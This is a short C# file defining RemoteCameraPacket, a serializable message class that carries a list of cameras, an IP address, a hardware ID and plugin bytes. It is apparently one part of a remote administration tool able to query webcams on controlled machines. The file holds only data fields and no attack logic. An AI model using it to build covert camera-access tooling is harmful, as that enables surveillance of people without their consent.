using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteCameraPacket : IPacket
    {
        public RemoteCameraPacket() : base()
        {
            this.packetType = PacketType.RC_GET_CAM;
        }

        public RemoteCameraPacket(List<string> cameras, string baseIp, string HWID) : base()
        {
            this.packetType = PacketType.RC_GET_CAM;          
            this.baseIp = baseIp;
            this.HWID = HWID; 
            
            this.cameras = cameras;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<string> cameras { get; set; }
    }
}
